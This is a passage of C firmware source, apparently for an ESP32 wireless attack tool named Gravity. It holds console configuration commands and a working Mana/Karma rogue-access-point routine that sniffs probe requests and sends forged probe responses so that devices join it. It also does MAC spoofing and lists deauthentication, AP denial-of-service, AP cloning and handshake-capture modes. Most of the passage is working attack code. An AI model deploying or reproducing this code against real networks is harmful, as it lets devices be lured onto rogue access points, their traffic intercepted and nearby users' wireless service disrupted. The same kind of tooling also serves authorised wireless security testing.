    /* Start/stop hopping task loop as needed */
    hop_millis = dwellTime();
    char *args[] = {"hop","on"};
    if (isHopEnabled()) {
        ESP_ERROR_CHECK(cmd_hop(2, args));
    } else {
        args[1] = "off";
        ESP_ERROR_CHECK(cmd_hop(2, args));
    }

    return ESP_OK;
}

/* Set application configuration variables */
/* At the moment these config settings are not retained between
   Gravity instances. Many of them are initialised in beacon.h.
   Usage: set <variable> <value>
   Allowed values for <variable> are:
      SSID_LEN_MIN, SSID_LEN_MAX, DEFAULT_SSID_COUNT, CHANNEL,
      MAC, ATTACK_PKTS, ATTACK_MILLIS */
/* Channel hopping is not catered for in this feature */
int cmd_set(int argc, char **argv) {
    if (argc != 3) {
        ESP_LOGE(TAG, "%s", USAGE_SET);
        ESP_LOGE(TAG, "<variable> : SSID_LEN_MIN | SSID_LEN_MAX | DEFAULT_SSID_COUNT | CHANNEL |");
        ESP_LOGE(TAG, "             MAC | ATTACK_PKTS | ATTACK_MILLIS | MAC_RAND");
        return ESP_ERR_INVALID_ARG;
    }
    if (!strcasecmp(argv[1], "SSID_LEN_MIN")) {
        //
        int iVal = atoi(argv[2]);
        if (iVal < 0 || iVal > SSID_LEN_MAX) {
            ESP_LOGE(TAG, "Invalid value specified. SSID_LEN_MIN must be between 0 and SSID_LEN_MAX (%d).", SSID_LEN_MAX);
            return ESP_ERR_INVALID_ARG;
        }
        SSID_LEN_MIN = iVal;
        ESP_LOGI(TAG, "SSID_LEN_MIN is now %d", SSID_LEN_MIN);
        return ESP_OK;
    } else if (!strcasecmp(argv[1], "SSID_LEN_MAX")) {
        //
        int iVal = atoi(argv[2]);
        if (iVal < SSID_LEN_MIN) {
            ESP_LOGE(TAG, "Invalid value specified. SSID_LEN_MAX must be greater than SSID_LEN_MIN (%d)", SSID_LEN_MIN);
            return ESP_ERR_INVALID_ARG;
        }
        SSID_LEN_MAX = iVal;
        ESP_LOGI(TAG, "SSID_LEN_MAX is now %d", SSID_LEN_MAX);
        return ESP_OK;
    } else if (!strcasecmp(argv[1], "DEFAULT_SSID_COUNT")) {
        //
        int iVal = atoi(argv[2]);
        if (iVal <= 0) {
            ESP_LOGE(TAG, "Invalid value specified. DEFAULT_SSID_COUNT must be a positive integer. Received %d", iVal);
            return ESP_ERR_INVALID_ARG;
        }
        DEFAULT_SSID_COUNT = iVal;
        ESP_LOGI(TAG, "DEFAULT_SSID_COUNT is now %d", DEFAULT_SSID_COUNT);
        return ESP_OK;
    } else if (!strcasecmp(argv[1], "CHANNEL")) {
        //
        uint8_t channel = atoi(argv[2]);
        wifi_second_chan_t chan2 = WIFI_SECOND_CHAN_ABOVE;
        esp_err_t err = esp_wifi_set_channel(channel, chan2);
        if (err != ESP_OK) {
            ESP_LOGE(TAG, "Error while setting channel: %s", esp_err_to_name(err));
        } else {
            ESP_LOGI(TAG, "Successfully changed to channel %u", channel);
        }
        return err;
    } else if (!strcasecmp(argv[1], "MAC")) {
        //
        uint8_t bMac[6];
        esp_err_t err = mac_string_to_bytes(argv[2], bMac);
        if ( err != ESP_OK) {
            ESP_LOGE(TAG, "Unable to convert \"%s\" to a byte array: %s.", argv[2], esp_err_to_name(err));
            return err;
        }
        err = esp_wifi_set_mac(WIFI_IF_AP, bMac);
        if (err != ESP_OK) {
            ESP_LOGE(TAG, "Failed to set MAC :  %s", esp_err_to_name(err));
            return err;
        }
        ESP_LOGI(TAG, "Set MAC to :  %s", argv[2]);
        return ESP_OK;
    } else if (!strcasecmp(argv[1], "MAC_RAND")) {
        if (!strcasecmp(argv[2], "ON")) {
            attack_status[ATTACK_RANDOMISE_MAC] = true;
        } else if (!strcasecmp(argv[2], "OFF")) {
            attack_status[ATTACK_RANDOMISE_MAC] = false;
        } else {
            ESP_LOGE(TAG, "Usage: set MAC_RAND [ ON | OFF ]");
            return ESP_ERR_INVALID_ARG;
        }
        ESP_LOGI(TAG, "MAC randomisation :  %s", (attack_status[ATTACK_RANDOMISE_MAC])?"ON":"OFF");
        return ESP_OK;
    } else if (!strcasecmp(argv[1], "ATTACK_PKTS")) {
        ESP_LOGI(TAG, "This command has not been implemented.");
    } else if (!strcasecmp(argv[1], "ATTACK_MILLIS")) {
        ESP_LOGI(TAG, "This command has not been implemented.");
    } else {
        ESP_LOGE(TAG, "Invalid variable specified. %s", USAGE_SET);
        ESP_LOGE(TAG, "<variable> : SSID_LEN_MIN | SSID_LEN_MAX | DEFAULT_SSID_COUNT | CHANNEL |");
        ESP_LOGE(TAG, "             MAC | ATTACK_PKTS | ATTACK_MILLIS");
        return ESP_ERR_INVALID_ARG;
    }

    return ESP_OK;
}

/* Get application configuration items */
/* Usage: set <variable> <value>
   Allowed values for <variable> are:
      SSID_LEN_MIN, SSID_LEN_MAX, DEFAULT_SSID_COUNT, CHANNEL,
      MAC, ATTACK_PKTS, ATTACK_MILLIS */
/* Channel hopping is not catered for in this feature */
int cmd_get(int argc, char **argv) {
    if (argc != 2) {
        ESP_LOGE(TAG, "%s", USAGE_GET);
        ESP_LOGE(TAG, "<variable> : SSID_LEN_MIN | SSID_LEN_MAX | DEFAULT_SSID_COUNT | CHANNEL |");
        ESP_LOGE(TAG, "             MAC | ATTACK_PKTS | ATTACK_MILLIS | MAC_RAND");
        return ESP_ERR_INVALID_ARG;
    }
    if (!strcasecmp(argv[1], "SSID_LEN_MIN")) {
        ESP_LOGI(TAG, "SSID_LEN_MIN :  %d", SSID_LEN_MIN);
    } else if (!strcasecmp(argv[1], "SSID_LEN_MAX")) {
        ESP_LOGI(TAG, "SSID_LEN_MAX :  %d", SSID_LEN_MAX);
    } else if (!strcasecmp(argv[1], "DEFAULT_SSID_COUNT")) {
        ESP_LOGI(TAG, "DEFAULT_SSID_COUNT :  %d", DEFAULT_SSID_COUNT);
    } else if (!strcasecmp(argv[1], "CHANNEL")) {
        uint8_t channel;
        wifi_second_chan_t second;
        esp_err_t err = esp_wifi_get_channel(&channel, &second);
        if (err != ESP_OK) {
            ESP_LOGE(TAG, "Failed to get current channel: %s", esp_err_to_name(err));
            return err;
        }
        char *secondary;
        switch (second) {
        case WIFI_SECOND_CHAN_NONE:
            secondary = "WIFI_SECOND_CHAN_NONE";
            break;
        case WIFI_SECOND_CHAN_ABOVE:
            secondary = "WIFI_SECOND_CHAN_ABOVE";
            break;
        case WIFI_SECOND_CHAN_BELOW:
            secondary = "WIFI_SECOND_CHAN_BELOW";
            break;
        default:
            ESP_LOGW(TAG, "esp_wifi_get_channel() returned a weird second channel - %d", second);
            secondary = "";
        }
        ESP_LOGI(TAG, "Channel: %u   Secondary: %s", channel, secondary);
        return ESP_OK;
    } else if (!strcasecmp(argv[1], "MAC")) {
        //
        uint8_t bMac[6];
        char strMac[18];
        esp_err_t err = esp_wifi_get_mac(WIFI_IF_AP, bMac);
        if (err != ESP_OK) {
            ESP_LOGE(TAG, "Failed to get MAC address from WiFi driver: %s", esp_err_to_name(err));
            return err;
        }
        err = mac_bytes_to_string(bMac, strMac);
        if (err != ESP_OK) {
            ESP_LOGE(TAG, "Failed to convert MAC bytes to string: %s", esp_err_to_name(err));
            return err;
        }
        ESP_LOGI(TAG, "Current MAC :  %s", strMac);
        return ESP_OK;
    } else if (!strcasecmp(argv[1], "MAC_RAND")) {
        ESP_LOGI(TAG, "MAC Randomisation is :  %s", (attack_status[ATTACK_RANDOMISE_MAC])?"ON":"OFF");
        return ESP_OK;
    } else if (!strcasecmp(argv[1], "ATTACK_PKTS")) {
        //
        ESP_LOGI(TAG, "Not yet implemented");
    } else if (!strcasecmp(argv[1], "ATTACK_MILLIS")) {
        //
    } else {
        ESP_LOGE(TAG, "Invalid variable specified. %s", USAGE_GET);
        ESP_LOGE(TAG, "<variable> : SSID_LEN_MIN | SSID_LEN_MAX | DEFAULT_SSID_COUNT | CHANNEL |");
        ESP_LOGE(TAG, "             MAC | ATTACK_PKTS | ATTACK_MILLIS");
        return ESP_ERR_INVALID_ARG;
    }

    return ESP_OK;
}

/* Channel hopping is not catered for in this feature */
int cmd_view(int argc, char **argv) {
    if (argc != 2 && argc != 3) {
        ESP_LOGE(TAG, "%s", USAGE_VIEW);
        return ESP_ERR_INVALID_ARG;
    }
    bool success = true;
    for (int i=1; i < argc; ++i) {
        if (!strcasecmp(argv[i], "AP")) {
            success = (success && gravity_list_ap() == ESP_OK);
        } else if (!strcasecmp(argv[i], "STA")) {
            success = (success && gravity_list_sta() == ESP_OK);
        } else {
            ESP_LOGE(TAG, "%s", USAGE_VIEW);
            return ESP_ERR_INVALID_ARG;
        }
    }
    if (success) {
        return ESP_OK;
    }
    return ESP_ERR_NO_MEM;
}

/* Channel hopping is not catered for in this feature */
int cmd_select(int argc, char **argv) {
    if (argc < 3 || (strcasecmp(argv[1], "AP") && strcasecmp(argv[1], "STA"))) {
        ESP_LOGE(TAG, "%s", USAGE_SELECT);
        return ESP_ERR_INVALID_ARG;
    }

    esp_err_t err = ESP_OK;;
    if (!strcasecmp(argv[1], "AP")) {
        for (int i = 2; i < argc; ++i) {
            err = gravity_select_ap(atoi(argv[i]));
            ESP_LOGI(TAG, "AP element %d is %sselected", atoi(argv[i]), (gravity_ap_isSelected(atoi(argv[i])))?"":"not ");
        }
    } else if (!strcasecmp(argv[1], "STA")) {
        for (int i = 2; i < argc; ++i) {
            err = gravity_select_sta(atoi(argv[i]));
            ESP_LOGI(TAG, "STA element %d is %sselected", atoi(argv[i]), (gravity_sta_isSelected(atoi(argv[i])))?"":"not ");
        }
    }
    return err;
}

/* Channel hopping is not catered for in this feature */
int cmd_clear(int argc, char **argv) {
    if (argc != 2 && argc != 3) {
        ESP_LOGE(TAG, "%s", USAGE_CLEAR);
        return ESP_ERR_INVALID_ARG;
    }
    for (int i=1; i < argc; ++i) {
        if (strcasecmp(argv[i], "AP") && strcasecmp(argv[i], "STA") && strcasecmp(argv[i], "ALL")) {
            ESP_LOGE(TAG, "%s", USAGE_CLEAR);
            return ESP_ERR_INVALID_ARG;
        }
        if (!(strcasecmp(argv[i], "AP") && strcasecmp(argv[i], "ALL"))) {
            ESP_ERROR_CHECK(gravity_clear_ap());
        }
        if (!(strcasecmp(argv[i], "STA") && strcasecmp(argv[i], "ALL"))) {
            ESP_ERROR_CHECK(gravity_clear_sta());
        }
    }
    return ESP_OK;
}

int cmd_handshake(int argc, char **argv) {
    /* TODO: Set attack_status appropriately */

    /* Start hopping task loop if hopping is on by default */
    hop_millis = dwellTime();
    char *args[] = {"hop","on"};
    if (isHopEnabled()) {
        ESP_ERROR_CHECK(cmd_hop(2, args));
    } else {
        args[1] = "off";
        ESP_ERROR_CHECK(cmd_hop(2, args));
    }

    return ESP_OK;
}

esp_err_t send_probe_response(uint8_t *srcAddr, uint8_t *destAddr, char *ssid, enum PROBE_RESPONSE_AUTH_TYPE authType, uint16_t seqNum) {
    uint8_t *probeBuffer;

    #ifdef DEBUG_VERBOSE
        printf("send_probe_response(): ");
        char strSrcAddr[18];
        char strDestAddr[18];
        char strAuthType[15];
        mac_bytes_to_string(srcAddr, strSrcAddr);
        mac_bytes_to_string(destAddr, strDestAddr);
        switch (authType) {
        case AUTH_TYPE_NONE:
            strcpy(strAuthType, "AUTH_TYPE_NONE");
            break;
        case AUTH_TYPE_WEP:
            strcpy(strAuthType, "AUTH_TYPE_WEP");
            break;
        case AUTH_TYPE_WPA:
            strcpy(strAuthType, "AUTH_TYPE_WPA");
            break;
        }
        printf("srcAddr: %s\tdestAddr: %s\tSSID: \"%s\"\tauthType: %s\n", strSrcAddr, strDestAddr, ssid, strAuthType);
    #endif

    probeBuffer = malloc(sizeof(uint8_t) * 208);
    if (probeBuffer == NULL) {
        ESP_LOGE(MANA_TAG, "Failed to register probeBuffer on the stack");
        return ESP_ERR_NO_MEM;
    }
    /* Copy bytes to SSID (correct src/dest later) */
    memcpy(probeBuffer, probe_response_raw, PROBE_RESPONSE_SSID_OFFSET - 1);
    /* Replace SSID length and append SSID */
    probeBuffer[PROBE_RESPONSE_SSID_OFFSET - 1] = strlen(ssid);
    //memcpy(&probeBuffer[PROBE_RESPONSE_SSID_OFFSET], ssid, strlen(ssid));
    memcpy(&probeBuffer[PROBE_RESPONSE_SSID_OFFSET], ssid, sizeof(char) * strlen(ssid));
    /* Append the remainder of the packet */
    memcpy(&probeBuffer[PROBE_RESPONSE_SSID_OFFSET + strlen(ssid)], &probe_response_raw[PROBE_RESPONSE_SSID_OFFSET], sizeof(probe_response_raw) - PROBE_RESPONSE_SSID_OFFSET);
    
    /* Set source and dest MACs */
    memcpy(&probeBuffer[PROBE_RESPONSE_SRC_ADDR_OFFSET], srcAddr, 6);
    memcpy(&probeBuffer[PROBE_RESPONSE_BSSID_OFFSET], srcAddr, 6);
    memcpy(&probeBuffer[PROBE_RESPONSE_DEST_ADDR_OFFSET], destAddr, 6);

    /* Set authentication method */
    uint8_t *bAuthType = NULL;
    switch (authType) {
    case AUTH_TYPE_NONE:
        bAuthType = PRIVACY_OFF_BYTES;
        probeBuffer[PROBE_RESPONSE_AUTH_TYPE_OFFSET + probeBuffer[PROBE_RESPONSE_SSID_OFFSET - 1]] = 0x00;
        break;
    case AUTH_TYPE_WEP:
        bAuthType = PRIVACY_ON_BYTES;
        probeBuffer[PROBE_RESPONSE_AUTH_TYPE_OFFSET + probeBuffer[PROBE_RESPONSE_SSID_OFFSET - 1]] = 0x01;
        break;
    case AUTH_TYPE_WPA:
        bAuthType = PRIVACY_ON_BYTES;
        probeBuffer[PROBE_RESPONSE_AUTH_TYPE_OFFSET + probeBuffer[PROBE_RESPONSE_SSID_OFFSET - 1]] = 0x02;
        break;
    default:
        ESP_LOGE(MANA_TAG, "Unrecognised authentication type: %d\n", authType);
        return ESP_ERR_INVALID_ARG;
    }
    memcpy(&probeBuffer[PROBE_RESPONSE_PRIVACY_OFFSET], bAuthType, 2);

    /* Decode, increment and recode seqNum */
    uint16_t seq = seqNum >> 4;
    ++seq;
    uint16_t newSeq = seq << 4 | (seq & 0x000f);
    uint8_t finalSeqNum[2];
    finalSeqNum[0] = (newSeq & 0x00FF);
    finalSeqNum[1] = (newSeq & 0xFF00) >> 8;
    memcpy(&probeBuffer[PROBE_SEQNUM_OFFSET], finalSeqNum, 2);

    #ifdef DEBUG_VERBOSE
        char debugOut[1024];
        int debugLen=0;
        strcpy(debugOut, "SSID: \"");
        debugLen += strlen("SSID: \"");
        strncpy(&debugOut[debugLen], (char*)&probeBuffer[PROBE_RESPONSE_SSID_OFFSET], probeBuffer[PROBE_RESPONSE_SSID_OFFSET-1]);
        debugLen += probeBuffer[PROBE_RESPONSE_SSID_OFFSET-1];
        sprintf(&debugOut[debugLen], "\"\tsrcAddr: ");
        debugLen += strlen("\"\tsrcAddr: ");
        char strMac[18];
        mac_bytes_to_string(&probeBuffer[PROBE_RESPONSE_SRC_ADDR_OFFSET], strMac);
        strncpy(&debugOut[debugLen], strMac, strlen(strMac));
        debugLen += strlen(strMac);
        sprintf(&debugOut[debugLen], "\tBSSID: ");
        debugLen += strlen("\tBSSID: ");
        mac_bytes_to_string(&probeBuffer[PROBE_RESPONSE_BSSID_OFFSET], strMac);
        strncpy(&debugOut[debugLen], strMac, strlen(strMac));
        debugLen += strlen(strMac);
        sprintf(&debugOut[debugLen], "\tdestAddr: ");
        debugLen += strlen("\tdestAddr: ");
        mac_bytes_to_string(&probeBuffer[PROBE_RESPONSE_DEST_ADDR_OFFSET], strMac);
        strncpy(&debugOut[debugLen], strMac, strlen(strMac));
        debugLen += strlen(strMac);
        sprintf(&debugOut[debugLen], "\tAuthType: \"0x%02x 0x%02x\"", probeBuffer[PROBE_RESPONSE_PRIVACY_OFFSET], probeBuffer[PROBE_RESPONSE_PRIVACY_OFFSET+1]);
        debugLen += strlen("\tAuthType: \"0x 0x\"\n") + 4;
        sprintf(&debugOut[debugLen], "\tSeqNum: \"0x%02x 0x%02x\"\n", probeBuffer[PROBE_SEQNUM_OFFSET], probeBuffer[PROBE_SEQNUM_OFFSET+1]);
        debugLen += strlen("\tSeqNum: \"0x 0x\"\n") + 4;
        debugOut[debugLen] = '\0';
        printf("About to transmit %s\n", debugOut);
    #endif

    // Send the frame
    /* Pause first */
    vTaskDelay(1);
    esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, probeBuffer, sizeof(probe_response_raw) + strlen(ssid), false);
    free(probeBuffer);
    return e;
}

/* Monitor mode callback
   This is the callback function invoked when the wireless interface receives any selected packet.
   Currently it only responds to management packets.
   This function:
    - Displays packet info when sniffing is enabled
    - Coordinates Mana probe responses when Mana is enabled
    - Invokes relevant functions to manage scan results, if scanning is enabled
*/
void wifi_pkt_rcvd(void *buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *data = (wifi_promiscuous_pkt_t *)buf;

    if (!(attack_status[ATTACK_SNIFF] || attack_status[ATTACK_MANA] || attack_status[ATTACK_SCAN])) {
        // No reason to listen to the packets
        return;
    }

    uint8_t *payload = data->payload;
    if (payload == NULL) {
        // Not necessarily an error, just a different payload
        return;
    }

    /* Just send the whole packet to the scanner */
    if (attack_status[ATTACK_SCAN]) {
        scan_wifi_parse_frame(payload);
    }
    if (payload[0] == 0x40) {
        //printf("W00T! Got a probe request!\n");
        int ssid_len = payload[PROBE_SSID_OFFSET - 1];
        char *ssid = malloc(sizeof(char) * (ssid_len + 1));
        if (ssid == NULL) {
            ESP_LOGE(TAG, "Failed to allocate memory to hold probe request's SSID");
            return;
        }
        strncpy(ssid, (char *)&payload[PROBE_SSID_OFFSET], ssid_len);
        ssid[ssid_len] = '\0';
        
        #ifdef DEBUG_VERBOSE
            char srcMac[18];
            esp_err_t err = mac_bytes_to_string(&payload[PROBE_SRCADDR_OFFSET], srcMac);
            ESP_LOGI(TAG, "Probe for \"%s\" from %s", ssid, srcMac);
        #endif
        if (attack_status[ATTACK_MANA]) {
            /* Mana enabled - Send a probe response
               Get current MAC - NOTE: MAC hopping during the Mana attack will render the attack useless
                                       Make sure you're not running a process that uses MAC randomisation at the same time
            */
            /* Prepare parameters that are needed to respond to both broadcast and directed probe requests */
            uint8_t bCurrentMac[6];
            char strCurrentMac[18];
            esp_err_t err = esp_wifi_get_mac(WIFI_IF_AP, bCurrentMac);
            if (err == ESP_OK) {
                mac_bytes_to_string(bCurrentMac, strCurrentMac);
            } else {
                memcpy(bCurrentMac, &payload[PROBE_DESTADDR_OFFSET], 6);
                mac_bytes_to_string(bCurrentMac, strCurrentMac);
                ESP_LOGW(MANA_TAG, "Failed to get MAC from device, falling back to the frame's BSSID: %s\n", strCurrentMac);
            }
            /* Copy destMac into a 6-byte array */
            uint8_t bDestMac[6];
            memcpy(bDestMac, &payload[PROBE_SRCADDR_OFFSET], 6);
            char strDestMac[18];
            err = mac_bytes_to_string(bDestMac, strDestMac);
            if (err != ESP_OK) {
                ESP_LOGE(MANA_TAG, "Unable to convert probe request source MAC from bytes to string: %s", esp_err_to_name(err));
                return;
            }

            /* Get sequence number */
            uint16_t seqNum = 0;
            seqNum = ((uint16_t)payload[PROBE_SEQNUM_OFFSET + 1] << 8) | payload[PROBE_SEQNUM_OFFSET];

            if (ssid_len == 0) {
                /* Broadcast probe request - send a probe response for every SSID in the STA's PNL */
                #ifdef DEBUG
                    ESP_LOGI(MANA_TAG, "Received broadcast probe from %s", strDestMac);
                #endif

                /* Mana Loud implementation - Respond to a broadcast probe by sending a probe response
                   for every SSID in all STAs.
                   I was undecided between getting a unique set of SSIDs to send a single response per SSID,
                   and just sending responses for every SSID in every station - doubtless with many
                   duplicates.
                   I settled on the latter, but with flawed reasoning.
                   TODO: Refactor the below to send a maximum of one probe response for each AP
                */
                /* Update to Mana Loud - Do NOT send duplicate packets where many STAs know an AP */
                int loudSSIDCount = 0;
                char **loudSSIDs = NULL;
                int i;
                for (i = 0; i < networkCount; ++i) {
                    if (!strcasecmp(strDestMac, networkList[i].strMac) || attack_status[ATTACK_MANA_LOUD]) {
                    /* Cycle through networkList[i]'s SSIDs */
                        for (int j=0; j < networkList[i].ssidCount; ++j) {
                            if (!arrayContainsString(loudSSIDs, loudSSIDCount, networkList[i].ssids[j])) {
                                /* Add it */
                                char **newLoud = malloc(sizeof(char *) * (loudSSIDCount + 1));
                                if (newLoud == NULL) {
                                    ESP_LOGE(MANA_TAG, "Failed to realloc space for used Mana Loud SSIDs");
                                }
                                for (int k = 0; k < loudSSIDCount; ++k) {
                                    newLoud[k] = loudSSIDs[k];
                                }
                                if (loudSSIDCount > 0) {
                                    free(loudSSIDs);
                                    loudSSIDs = newLoud;
                                    ++loudSSIDCount;
                                }
                                #ifdef DEBUG
                                    ESP_LOGI(MANA_TAG, "Sending probe response to %s for \"%s\"", strDestMac, networkList[i].ssids[j]);
                                #endif
                                send_probe_response(bCurrentMac, bDestMac, networkList[i].ssids[j], mana_auth, seqNum);
                            }
                        }
                    }
                }
                if (loudSSIDCount > 0) {
                    free(loudSSIDs);
                }
            } else {
                /* Directed probe request - Send a directed probe response in reply */
                ESP_LOGI(MANA_TAG, "Received directed probe from %s for \"%s\"", strDestMac, ssid);

                /* Mana attack - Add the current SSID to the station's preferred network
                   list if it's not already there 
                */
                int i;
                /* Look for STA's MAC in networkList[] */
                for (i=0; i < networkCount && strcmp(strDestMac, networkList[i].strMac); ++i) { }
                if (i < networkCount) {
                    /* The station is in networkList[] - See if it contains the SSID */
                    #ifdef DEBUG
                        ESP_LOGI(MANA_TAG, "STA %s matched to PNL for %s at networkList[%d]. PNL count: %d", strDestMac, networkList[i].strMac, i, networkList[i].ssidCount);
                    #endif
                    int j;
                    for (j=0; j < networkList[i].ssidCount && strcmp(ssid, networkList[i].ssids[j]); ++j) { }
                    if (j == networkList[i].ssidCount) {
                        /* SSID was not found in ssids, add it to the list */
                        #ifdef DEBUG
                            ESP_LOGI(MANA_TAG, "SSID \"%s\" not found in PNL, add it", ssid);
                        #endif
                        char **newSsids = malloc(sizeof(char *) * (networkList[i].ssidCount + 1));
                        if (newSsids == NULL) {
                            ESP_LOGW(MANA_TAG, "Unable to add SSID \"%s\" to PNL for STA %s", ssid, strDestMac);
                        } else {
                            /* Copy existing SSIDs to newSsids */
                            for (int k=0; k < networkList[i].ssidCount; ++k) {
                                newSsids[k] = networkList[i].ssids[k];
                            }
                            /* Append the new SSID */
                            newSsids[j] = malloc(sizeof(char) * (strlen(ssid) + 1));
                            if (newSsids[j] == NULL) {
                                ESP_LOGW(MANA_TAG, "Failed to allocate bytes to hold SSID \"%s\" for STA %s", ssid, strDestMac);
                                free(newSsids);
                            } else {
                                strcpy(newSsids[j], ssid);
                                /* Only replace networkList[i].ssids with newSsids if we make it all this way */
                                free(networkList[i].ssids);
                                networkList[i].ssids = newSsids;
                                networkList[i].ssidCount++;
                            }
                        }
                    }
                } else {
                    /* Add the station to networkList[] */
                    NetworkList *newList = malloc(sizeof(NetworkList) * (networkCount + 1));
                    int newCount = networkCount + 1;
                    if (newList == NULL) {
                        ESP_LOGW(MANA_TAG, "Unable to allocate memory to hold the Preferred Network List for STA %s. This will downgrade the Mana attack to a Karma attack.", strDestMac);
                    } else {
                        /* Copy across elements from networkList[] */
                        for (int j=0; j < networkCount; ++j) {
                            newList[j].ssidCount = networkList[j].ssidCount;
                            newList[j].ssids = networkList[j].ssids;
                            strcpy(newList[j].strMac, networkList[j].strMac);
                            memcpy(newList[j].bMac, networkList[j].bMac, 6);
                        }
                        /* Initialise a new NetworkList for this station */
                        strcpy(newList[networkCount].strMac, strDestMac);
                        memcpy(newList[networkCount].bMac, bDestMac, 6);
                        newList[networkCount].ssidCount = 1;
                        newList[networkCount].ssids = malloc(sizeof(char *));

                        if (newList[networkCount].ssids == NULL) {
                            ESP_LOGW(MANA_TAG, "Failed to allocate memory to hold SSID \"%s\" for STA %s. This SSID/STA pair will experience the Karma, not Mana, attack", ssid, strDestMac);
                        } else {
                            newList[networkCount].ssids[0] = malloc(sizeof(char) * (strlen(ssid) + 1));
                            if (newList[networkCount].ssids[0] == NULL) {
                                ESP_LOGW(MANA_TAG, "Failed to reserve bytes to hold SSID \"%s\" for STA %s. This SSID/STA tuple will get the Karma attack instead.", ssid, strDestMac);
                            } else {
                                strcpy(newList[networkCount].ssids[0], ssid);
                            }
                        }
                        /* Replace networkList[] with newList[] - Without leaking memory */
                        /* Loop through networkList[i].ssids and free each SSID before free'ing networkList itself*/
                        /* Actually no, don't do that. ssids and its elements are copied into the new array */
                        free(networkList);
                        networkList = newList;
                        networkCount = newCount;
                    }
                }

                /* Send probe response */
                send_probe_response(bCurrentMac, bDestMac, ssid, mana_auth, seqNum);
            }
        }
        free(ssid);
    } 
    return;
}

int initialise_wifi() {
    /* Initialise WiFi if needed */
    if (!WIFI_INITIALISED) {
        esp_err_t ret = nvs_flash_init();
        if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
            ESP_ERROR_CHECK(nvs_flash_erase());
            ret = nvs_flash_init();
        }
        ESP_ERROR_CHECK(ret);

        ESP_ERROR_CHECK(esp_netif_init());
        ESP_ERROR_CHECK(esp_event_loop_create_default());
        esp_netif_create_default_wifi_ap();

        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();

        ESP_ERROR_CHECK(esp_wifi_init(&cfg));
        ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));

        /* Init dummy AP to specify a channel and get WiFi hardware into a
           mode where we can send the actual fake beacon frames. */
        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
        wifi_config_t ap_config = {
            .ap = {
                .ssid = "ManagementAP",
                .ssid_len = 12,
                .password = "management",
                .channel = 1,
                .authmode = WIFI_AUTH_OPEN,
                .ssid_hidden = 0,
                .max_connection = 128,
                .beacon_interval = 5000
            }
        };

        ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
        ESP_ERROR_CHECK(esp_wifi_start());
        ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));

        // Set up promiscuous mode and packet callback
        wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_CTRL | WIFI_PROMIS_FILTER_MASK_DATA };
        esp_wifi_set_promiscuous_filter(&filter);
        esp_wifi_set_promiscuous_rx_cb(wifi_pkt_rcvd);
        esp_wifi_set_promiscuous(true);
        WIFI_INITIALISED = true;
    }
    return ESP_OK;
}

static void initialize_filesystem(void)
{
    static wl_handle_t wl_handle;
    const esp_vfs_fat_mount_config_t mount_config = {
            .max_files = 4,
            .format_if_mount_failed = true
    };
    esp_err_t err = esp_vfs_fat_spiflash_mount_rw_wl(MOUNT_PATH, "storage", &mount_config, &wl_handle);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to mount FATFS (%s)", esp_err_to_name(err));
        return;
    }
}
#endif // CONFIG_STORE_HISTORY

static void initialize_nvs(void)
{
    esp_err_t err = nvs_flash_init();
    if (err == ESP_ERR_NVS_NO_FREE_PAGES || err == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK( nvs_flash_erase() );
        err = nvs_flash_init();
    }
    ESP_ERROR_CHECK(err);
}

static int register_gravity_commands() {
    esp_err_t err;
    for (int i=0; i < CMD_COUNT; ++i) {
        err = esp_console_cmd_register(&commands[i]);
        switch (err) {
        case ESP_OK:
            ESP_LOGI(TAG, "Registered command \"%s\"...", commands[i].command);
            break;
        case ESP_ERR_NO_MEM:
            ESP_LOGE(TAG, "Out of memory registering command \"%s\"!", commands[i].command);
            return ESP_ERR_NO_MEM;
        case ESP_ERR_INVALID_ARG:
            ESP_LOGW(TAG, "Invalid arguments provided during registration of \"%s\". Skipping...", commands[i].command);
            continue;
        }
    }
    return ESP_OK;
}

void app_main(void)
{
    /* Initialise attack_status, hop_defaults and hop_millis_defaults */
    attack_status = malloc(sizeof(bool) * ATTACKS_COUNT);
    if (attack_status == NULL) {
        ESP_LOGE(TAG, "Failed to allocate memory to manage attack status");
        return;
    }
    hop_defaults = malloc(sizeof(bool) * ATTACKS_COUNT);
    if (hop_defaults == NULL) {
        ESP_LOGE(TAG, "Failed to allocate memory to manage channel hopping defaults");
        free(attack_status);
        return;
    }
    hop_millis_defaults = malloc(sizeof(int) * ATTACKS_COUNT);
    if (hop_millis_defaults == NULL) {
        ESP_LOGE(TAG, "Failed to allocate memory to manage channel hopping default durations");
        free(attack_status);
        free(hop_defaults);
        return;
    }
    for (int i = 0; i < ATTACKS_COUNT; ++i) {
        switch (i) {
            case ATTACK_BEACON:
            case ATTACK_PROBE:
            case ATTACK_SNIFF:
            case ATTACK_DEAUTH:
            case ATTACK_SCAN:
            case ATTACK_MANA:
            case ATTACK_MANA_VERBOSE:
            case ATTACK_MANA_LOUD:
            case ATTACK_AP_DOS:
            case ATTACK_AP_CLONE:
            case ATTACK_HANDSHAKE:
                attack_status[i] = false;
                break;
            case ATTACK_RANDOMISE_MAC:
                attack_status[i] = true;
                break;
            default:
                ESP_LOGE(TAG, "ATTACKS_COUNT has incorrect length");
                free(attack_status);
                free(hop_defaults);
                free(hop_millis_defaults);
                return;
        }
    }
    for (int i = 0; i < ATTACKS_COUNT; ++i) {
        switch (i) {
            case ATTACK_BEACON:
            case ATTACK_PROBE:
            case ATTACK_SNIFF:
            case ATTACK_SCAN:
            case ATTACK_MANA:
                hop_defaults[i] = true;
                break;
            case ATTACK_DEAUTH:
            case ATTACK_MANA_VERBOSE:
            case ATTACK_MANA_LOUD:
            case ATTACK_AP_DOS:
            case ATTACK_AP_CLONE:
            case ATTACK_HANDSHAKE:
            case ATTACK_RANDOMISE_MAC:
                hop_defaults[i] = false;
                break;
            default:
                ESP_LOGE(TAG, "ATTACKS_COUNT has incorrect length");
